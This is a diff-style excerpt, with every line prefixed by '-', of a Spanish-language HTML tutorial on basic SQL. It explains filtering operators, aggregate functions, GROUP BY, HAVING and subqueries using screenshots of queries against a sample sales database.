-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado tenemos registros donde los clientes son de &lt;code&gt;Argentina&lt;/code&gt; y tambien a los clientes que son de la ciudad de &lt;code&gt;Barcelona&lt;/code&gt; ya que con &lt;code&gt;OR&lt;/code&gt; solo una de las condiones debe cumplirse para que me devuelva los registros.&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-not&quot;&gt;OPERADOR NOT &lt;a href=&quot;#operador-not&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Lo que hacemos con &lt;code&gt;NOT&lt;/code&gt; es simplemente negar la sentencia que realizamos, de este modo al agregar el &lt;code&gt;NOT&lt;/code&gt; el resultado que nos mostrara vendra a ser lo contrario a nuestra condicion en nuestra consulta.&lt;/p&gt;
-
-&lt;p&gt;Si quedriamos realizar una consulta donde queremos obtener los precios que sean mayores a &lt;code&gt;80&lt;/code&gt; de la tabla productos, si ejecutamos la consulta esta nos mostrara exactamente lo que queremos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero si usamos &lt;code&gt;NOT&lt;/code&gt; lo que se hace es negar la consulta y hacer lo contrario, basicamente con &lt;code&gt;NOT&lt;/code&gt; le diriamos mediante una consulta que nos seleccione los precios donde &lt;code&gt;NO&lt;/code&gt; sean mayores a &lt;code&gt;80&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-limit&quot;&gt;OPERADOR LIMIT &lt;a href=&quot;#operador-limit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Cuando queremos limitar el numero de registros que nos arroja una consulta usamos &lt;code&gt;LIMIT&lt;/code&gt;, con ello limitamos el numero de registros a cuantos queramos especificando la cantidad total en numeros despues de &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Supongamos que ahora queremos ejecutar una consulta que nos muestre de manera ordenada los precios de la tabla de los &lt;code&gt;Products&lt;/code&gt;, eso lo hariamos facilmente utilizando &lt;code&gt;ORDER BY&lt;/code&gt; . Pero en esta ocasión de esos precios ordenados solo queremos que se nos muestre los 5 primeros registros, pues ahi es donde vamos a utilizar el &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y de esta manera tendriamos el precio de los 5 produtos mas caros.&lt;/p&gt;
-
-&lt;p&gt;De la misma manera podriamos modificar la consulta y usar &lt;code&gt;ASC&lt;/code&gt; y de esta manera nos mostraria los 5 productos de menor precio.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-distinct&quot;&gt;OPERADOR DISTINCT &lt;a href=&quot;#operador-distinct&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Este operador funciona de manera bastante similiar a &lt;code&gt;NOT&lt;/code&gt; ya que cuando lo usamos nos ejecuta exactamente lo contrario o distinto a la consulta, pero no es exactamente igual ya que &lt;code&gt;!=&lt;/code&gt; es un operador de comparación y se ejecuta realizando una comparación con todos los registros hasta validar uno correcto.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En cambio &lt;code&gt;NOT&lt;/code&gt; al ser un operador logico, trabaja haciendo la comparación directamente entre dos valores &lt;code&gt;booleanos&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si lo aplicamos &lt;code&gt;!=&lt;/code&gt; a efectos practicos en una consulta esta nos arrojara valores distintos al que especifiquemos, pero ahora ya tenemos en cuenta que no es lo mismo que usar &lt;code&gt;NOT&lt;/code&gt; aunque ambos se asemejen mucho.&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-between&quot;&gt;OPERADOR BETWEEN &lt;a href=&quot;#operador-between&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es un operador de comparación que se utiliza para seleccionar valores en un rango especifico, estos datos pueden ser de tipos numericos, fecha o texto.&lt;/p&gt;
-
-&lt;p&gt;Veamos un ejemplo donde vamos a seleccionar un rango de precios de nuestra tabla &lt;code&gt;Products&lt;/code&gt;, que iran desde &lt;code&gt;40 a 50&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos que la consulta nos arroja unicamente los precios del rango establecido y de esta manera podemos simplificar nuestra consulta usando &lt;code&gt;BETWEEN&lt;/code&gt; y de esta manera optimizamos nuestras consultas.&lt;/p&gt;
-
-&lt;p&gt;Podemos tambien en vez de especicar un rango basandonos en un dato numerico, usar un dato de tipo fecha.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta manera podemos filtrar por un rango de fecha de nacimiento que corresponde a nuestros empleados de nuestra tabla &lt;code&gt;Employees&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-like&quot;&gt;OPERADOR LIKE &lt;a href=&quot;#operador-like&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;El operador &lt;code&gt;LIKE&lt;/code&gt;, lo usamos para hacer un filtro basandonos en patrones de cadena de texto, parecido a una expresión regular pero sin llegar a esa complejidad.&lt;/p&gt;
-
-&lt;p&gt;Para poder comprenderlo mejor vamos a usarlo para poder filtrar por cadenas de texto especificas en nuestra tabla de clients &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Realizaremos una consulta donde seleccionemos todos los datos del nombre de contacto &lt;code&gt;ContactName&lt;/code&gt; de nuesta tabla &lt;code&gt;Customers&lt;/code&gt; , donde con &lt;code&gt;LIKE&lt;/code&gt; le especificamos que la cadena de texto especifico por la cual filtraremos, empieze con cualquier valor pero que termine con la palabra “Devon”.&lt;/p&gt;
-
-&lt;p&gt;Esto lo hacemos anteponiendo el &lt;code&gt;%&lt;/code&gt; y seguidamente el texto por el cual queremos filtrar &lt;code&gt;&quot;%TEXTO&quot;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Del mismo modo si quisieramos que el filtrado sea parecido, pero que esta vez que el filtro empieze por un texto especifico y termine el cualquier cosa, solo debemos poder el &lt;code&gt;%&lt;/code&gt;al final &lt;code&gt;TEXTO%&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero tambien existe una forma de realizar un filtro, donde especifiquemos el texto independientemente comienze o termine, y que nos encuentre un resultado cuando unicamente contenga el texto.&lt;/p&gt;
-
-&lt;p&gt;Para ello usamos al inicio y al final &lt;code&gt;%&lt;/code&gt; y de esta manera especificamos que no importa si comienze o  termine con algo especifico, simplemente nos imprime la consulta si encuentra un match o coincidencia.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta forma la consulta nos arroja varias coincidencias donde se cumple la condición.&lt;/p&gt;
-
-&lt;p&gt;Ahora tambien podemos hacer otro tipo de filtrado usando &lt;code&gt;LIKE&lt;/code&gt;, supongamos queremos realizar una consulta donde buscamos filtrar en nuestra tabla &lt;code&gt;Employees&lt;/code&gt;, un nombre el cual comienze con la letra &lt;code&gt;N&lt;/code&gt;, termine con la letra &lt;code&gt;Y&lt;/code&gt; y ademas el nombre solo tenga cinco caracteres.&lt;/p&gt;
-
-&lt;p&gt;En ese caso usaremos &lt;code&gt;_&lt;/code&gt;, para especificar el numero total de caracteres desconocidos y en los extremos poner las letras conocidas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cada uno de los guiones bajos &lt;code&gt;_&lt;/code&gt;, hace referencia a un caracter el cual puede ser cualquiera incluidos espacios.&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-is-null-y-is-not-null&quot;&gt;OPERADOR IS NULL Y IS NOT NULL &lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En sql un valor &lt;code&gt;NULL&lt;/code&gt;, representa un valor desconocido, cuando insertamos filas en una tabla, sin asignarles un valor, estas automaticamente toman el valor nulo &lt;code&gt;NULL&lt;/code&gt;. Este valor al ser especial no podemos compararlo con operadores aritmeticos normales, en su lugar debemos usar los operadores &lt;code&gt;IS o IS NOT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Si seleccionamos todo de la tabla &lt;code&gt;Products&lt;/code&gt; y aplicamos un ordenamiento basandonos en &lt;code&gt;ProductName&lt;/code&gt;, por defecto esta nos devolvera al inicio los valores &lt;code&gt;NULL&lt;/code&gt;, de existir estos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero si aplicamos la condición donde vamos a indicarle que nos devuelvan solo los valores &lt;code&gt;NULL&lt;/code&gt;. Para ello usamos &lt;code&gt;IS NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y si al contrario me molestan ver los valores nulos y quiero quitarlos, pues usamos &lt;code&gt;IS NOT NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;la consulta nos devolvera todos los valores a excepción de los valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-in-y-not-in&quot;&gt;OPERADOR IN Y NOT IN &lt;a href=&quot;#operador-in-y-not-in&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Estos operadores simplifican el uso de usar multiples veces el operador &lt;code&gt;AND y OR&lt;/code&gt; al establecer multiples condiciones, ya que opera dentro de una lista de valores similar a una tupla &lt;code&gt;(valor1, valor2, valor3. valor4)&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Supongamos queremos listar varios &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, en ese caso deberiamos ejecutar la siguiente consulta.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Obtendriamos el resultado deseado, pero escribiriamos muchas lineas de codigo, lo que no seria optimo y mas bien tedioso. Justo en estos casos usamos &lt;code&gt;IN&lt;/code&gt; y de esta manera podemos operar sobre un grupo de valores y reducir varias lineas de nuestra consulta, y logrando que sea mas optima.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De la misma manera con &lt;code&gt;NOT IN&lt;/code&gt;, hacemos exactamente el mismo proceso, solo que esta vez al usar el &lt;code&gt;NOT&lt;/code&gt; se ejecutara lo contrario y imprimira los valores que no correspondan.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;comentarios-en-sql&quot;&gt;COMENTARIOS EN SQL &lt;a href=&quot;#comentarios-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; como en distintos lenguajes de programación usamos los comentarios para añadir una descripción al proposito de nuestro codigo.&lt;/p&gt;
-
-&lt;h3 id=&quot;comentar-una-linea&quot;&gt;COMENTAR UNA LINEA &lt;a href=&quot;#comentar-una-linea&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; usamos los &lt;code&gt;--&lt;/code&gt; para poder comentar una linea de codigo. &lt;code&gt;/*COMENTARIO*/&lt;/code&gt; si queremos comentar varias lineas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;comentar-varias-lineas&quot;&gt;COMENTAR VARIAS LINEAS &lt;a href=&quot;#comentar-varias-lineas&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Si queremos comentar varias lineas de codigo usamos &lt;code&gt;/*COMENTARIO*/&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;funciones-de-agregacion&quot;&gt;FUNCIONES DE AGREGACION &lt;a href=&quot;#funciones-de-agregacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Las funciones de agregación nos permiten efectuar operaciones sobre un conjunto de resultados, pero devolviendo un unico valor para todos ellos. En palabras mas simples nos permite obtener la media, maximos, minimos, sumantorias entre otras operaciones.&lt;/p&gt;
-
-&lt;p&gt;Estas funciones se utilizan con la clausula &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Veamos a continuación algunas de estas funciones:&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-sum&quot;&gt;FUNCION SUM &lt;a href=&quot;#funcion-sum&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La función &lt;code&gt;SUM&lt;/code&gt; nos devuelve la suma de los valores de un campo que especifiquemos, cabe mencionar que solo podemos usar esta función en valores numericos.&lt;/p&gt;
-
-&lt;p&gt;Por ejemplo si deseamos sumar todos los precios &lt;code&gt;Price&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, emitiriamos la siguiente consulta:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query40.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde dentro de los &lt;code&gt;()&lt;/code&gt; de la función &lt;code&gt;SUM&lt;/code&gt;, especifiriamos el campo el cual queremos sumar.&lt;/p&gt;
-
-&lt;p&gt;Aqui para tener una apreciación mejor podriamos crearnos un &lt;code&gt;ALIAS&lt;/code&gt; y establecer el nuevo campo como &lt;code&gt;SUMA_TOTAL_PRECIOS&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-count&quot;&gt;FUNCION COUNT &lt;a href=&quot;#funcion-count&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Esta función nos devuelve el numeros total de las filas seleccionadas.&lt;/p&gt;
-
-&lt;p&gt;De la misma manera debemos especificar dentro de &lt;code&gt;()&lt;/code&gt; el campo cuando agregemos la función &lt;code&gt;COUNT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;La consulta nos devuelve el total de filas del campo &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-min&quot;&gt;FUNCION MIX &lt;a href=&quot;#funcion-min&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La función &lt;code&gt;MIN&lt;/code&gt; nos devuelve el minimo valor de un campo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al aplicar la función en el campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio minimo.&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-max&quot;&gt;FUNCION MAX &lt;a href=&quot;#funcion-max&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;&lt;code&gt;Max&lt;/code&gt; nos devuelve el maximo valor del campo espeficado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aplicando la función en el mismo campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio maximo.&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-avg&quot;&gt;FUNCION AVG &lt;a href=&quot;#funcion-avg&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La función &lt;code&gt;AVG&lt;/code&gt;, nos devuelve como resultado el promedio del campo que especifiquemos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como se resultado obtenemos el promedio de los precio de el campo &lt;code&gt;Price&lt;/code&gt;, pero vemos que nos muestra un valor con muchas decimales, en ese caso podemos utilizar la función &lt;code&gt;ROUND&lt;/code&gt; para redondear el valor.&lt;/p&gt;
-
-&lt;h2 id=&quot;funcion-round&quot;&gt;FUNCION ROUND &lt;a href=&quot;#funcion-round&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como mencionamos anteriormente esta función nos va a redondear un valor, dandonos como resultado el valor entero.&lt;/p&gt;
-
-&lt;p&gt;Podemos aplicarlo a nuestra consulta anterior donde obteniamos el promedio, para que nos devuelva un valor entero.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aplicamos &lt;code&gt;ROUND&lt;/code&gt; encima de la función &lt;code&gt;AVG&lt;/code&gt; y obtenemos el promedio redondeado.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Estas funciones mencionadas son las basicas de &lt;code&gt;SQL&lt;/code&gt; y ademas las mas utilizadas, ya que cada gestor ofrece su propio conjunto mas amplio con otras funciones mas particulares.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;clausula-group-by&quot;&gt;CLAUSULA GROUP BY &lt;a href=&quot;#clausula-group-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La clausula &lt;code&gt;GROUP BY&lt;/code&gt;, la utilizamos para agrupar uno o varios registros segun uno o varios valores de la columna.&lt;/p&gt;
-
-&lt;p&gt;Como vemos a continuación tenemos el detalle de las ventas de los productos, pero si nosotros qusieramos obtener la cantidad de ventas por producto. En este caso usariamos la clausula &lt;code&gt;GROUP BY&lt;/code&gt; y de este modo obtendriamos un ordenamiento de cada producto segun su cantidad.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Supongamos que queremos obtener el promedio del precio de lo que cuestan los productos que ofrece cada proveedor.&lt;/p&gt;
-
-&lt;p&gt;Primero seleccionaremos el campo id del proveedor &lt;code&gt;SupplierID&lt;/code&gt; y el promedio redondeado de la tabla &lt;code&gt;Products&lt;/code&gt;. Esto nos dara como resultado el promedio total de los productos y el id que nos mostrara sera el primero, ya que como estamos usando una &lt;code&gt;función de agregación&lt;/code&gt; esta solo devuelve un unico valor.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y si ahora utilizamos &lt;code&gt;GROUP BY&lt;/code&gt; en el campo &lt;code&gt;SupplierID&lt;/code&gt;, lo que hara sera agruparnos por cada uno de los &lt;code&gt;SupplierID&lt;/code&gt; correspondientes a cada proveedor.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado obtendriamos el promedio del precio &lt;code&gt;Price&lt;/code&gt; de los productos que ofrece cada uno de nuestros proveedores.&lt;/p&gt;
-
-&lt;p&gt;Y que hacemos si ahora que obtuvimos el promedio queremos verlos en orden. Pues simplemente como vimos anteriormente agregaremos a nuestra consulta un &lt;code&gt;ORDER BY DESC&lt;/code&gt; y de esta manera verias los promedios ordenador de mayor a menor.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora que pasa si queremos usar una condición en esta consulta, donde solo nos muestre el promedio &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt; obtenido, pero solo si es mayor a 40.&lt;/p&gt;
-
-&lt;p&gt;Entonces automaticamente uno pensaria en usar una condición &lt;code&gt;WHERE&lt;/code&gt;, pero esta nos arroja un error.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Seguro te preguntaras por que me esta arrojando un error si estoy estableciendo una condición correctamente?&lt;/p&gt;
-
-&lt;p&gt;Pues esto se debe a que &lt;code&gt;WHERE&lt;/code&gt; trabaja haciendo un filtro de registros y en este caso al estar trabajando con &lt;code&gt;GROUP BY&lt;/code&gt; y con una &lt;code&gt;función de agregación&lt;/code&gt;, pasariamos a estar trabajando con grupos y por ese motivo &lt;code&gt;WHERE&lt;/code&gt; en este caso siempre nos daria un error.&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-having&quot;&gt;CLAUSULA HAVING &lt;a href=&quot;#clausula-having&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Anteriormente mencionamos que al trabajar con &lt;code&gt;GROUP BY&lt;/code&gt;, pasariamos de tratar con registros a hacer un filtrado por grupos. Por tanto asi como &lt;code&gt;WHERE&lt;/code&gt; realiza un filtrado por registros, cuando queremos ejecutar condiciones en grupos usamos la clausula &lt;code&gt;HAVING&lt;/code&gt; que funciona exactamente igual a &lt;code&gt;WHERE&lt;/code&gt; pero cabe mencionarlo nuevamente lo usamos cuando trabajamos con grupos.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto recordando nuestra anterior consulta donde queriamos que se nos muestre &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt;, pero solo si este era mayor a 40, nuestra consulta seria la siguiente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Veamos un nuevo ejemplo para que nos quede completamente claro. Vamos a suponer que queremos obtener cual fue el producto mas vendido del total de ventas.&lt;/p&gt;
-
-&lt;p&gt;Para ello usaremos la tabla de los detalles de la orden &lt;code&gt;OrderDetails&lt;/code&gt;, donde seleccionaremos el campo de &lt;code&gt;ProductID&lt;/code&gt; y el de &lt;code&gt;Quantity&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues aplicaremos la función de agregación &lt;code&gt;SUM()&lt;/code&gt; para sumar las cantidades &lt;code&gt;Quantity&lt;/code&gt; y las agruparemos con &lt;code&gt;GROUP BY&lt;/code&gt; por el id del producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta manera obtendremos la cantidad de productos agrupados segun el id de producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Finalmente aplicaremos un ordenamiento &lt;code&gt;ORDER BY&lt;/code&gt; por &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; de manera descendente y como solo queremos que se muestre el &lt;code&gt;ProductID&lt;/code&gt; que mas se vendio usamos un &lt;code&gt;LIMIT 1&lt;/code&gt; y obtendriamos el resultado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Bien ahora quiza te puedas preguntar por que añadimos un &lt;code&gt;ORDER BY&lt;/code&gt; y despues un &lt;code&gt;LIMIT&lt;/code&gt; si podriamos haber usado un &lt;code&gt;HAVING&lt;/code&gt; para usar una condición donde en base a &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; nos de el valor maximo empleando la función &lt;code&gt;MAX&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que nos arroja un error.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Esto se debe a que no es posible ejecutar una función de agregación sobre el resultado de otra función de agregación.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Asi que esa opción estaria descartada.&lt;/p&gt;
-
-&lt;h2 id=&quot;subconsultas&quot;&gt;SUBCONSULTAS &lt;a href=&quot;#subconsultas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Hasta ahora hemos realizado consultas basandonos en una sola tabla, pero que pasa en los casos donde necesitemos juntas campos de distintas tablas  para consultar algo concreto.
-Pues en ese caso existen algunas maneras y una de ellas es utilizando las &lt;code&gt;Subconsultas&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para pode usar este concepto primero debemos entender el concepto de tablas relacionales y si queremos trabajar con datos de varias tablas a traves de una relación debemos usar los &lt;code&gt;deintificadores&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Anteriomente gracias a las consultas &lt;code&gt;GROUP BY&lt;/code&gt; y &lt;code&gt;HAVING&lt;/code&gt;, pudimos agrupar por los identificadores y encontrar el producto que fue mas vendido. Pero si nos ponemos a analizar, el hecho de saber cual producto se vendio mas, no quiere decir que fue el que mas ganancias nos dio.&lt;/p&gt;
-
-&lt;p&gt;Y si quisieramos saber cual producto nos genero mas ingresos, en este caso tendriamos que relacionar las tablas &lt;code&gt;OrderDetails&lt;/code&gt; y &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Aqui es donde podemos usar el concepto de &lt;code&gt;Subconsultas&lt;/code&gt; que no es mas que una consulta dentro de otra consulta, es decir viene a ser una consulta que hace referencia a otra consulta.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cuando realizamos una consulta esta nos devuelve un valor , y una subconsulta como vemos en la imagen es realizar una nueva consulta de ese valor.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una cosa a tener en cuenta es que una &lt;code&gt;Subconsulta&lt;/code&gt; solo puede ser un &lt;code&gt;SELECT&lt;/code&gt; ya que esta solo nos devuelven información y no alteran a la base de datos.&lt;/p&gt;
-&lt;/blockquote&gt;
-
